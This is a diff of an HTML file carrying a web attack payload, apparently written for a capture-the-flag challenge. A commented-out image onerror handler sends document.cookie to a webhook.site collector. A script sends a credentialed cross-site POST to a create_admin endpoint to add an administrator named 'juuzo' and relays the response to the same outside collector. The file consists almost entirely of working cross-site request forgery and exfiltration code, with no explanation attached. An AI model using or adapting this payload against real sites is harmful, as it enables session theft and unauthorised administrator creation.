@@ -6,8 +6,7 @@
                     <!-- <img src="x" onerror="fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie)" alt=""> -->
        
 <script>
-(async()=>{
-const res = await fetch('https://tasks.goidactf.ru:20079/create_admin',
+fetch('https://tasks.goidactf.ru:20079/create_admin',
 {
     method:'POST',
     headers:{
@@ -17,12 +16,8 @@ const res = await fetch('https://tasks.goidactf.ru:20079/create_admin',
     credentials:'include',
     mode:'no-cors',
     body:'new_admin_login=juuzo'
-})
-const text = res.status;
-doc.getElementByTagName("button")[0].click();
-fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+text).then(r=>r.text()).then(d=>console.log(d))
+}).then(r=>r.text()).then(text=>fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+text).then(r=>r.text()).then(d=>console.log(d)))
 
-})();
 </script>
 
 
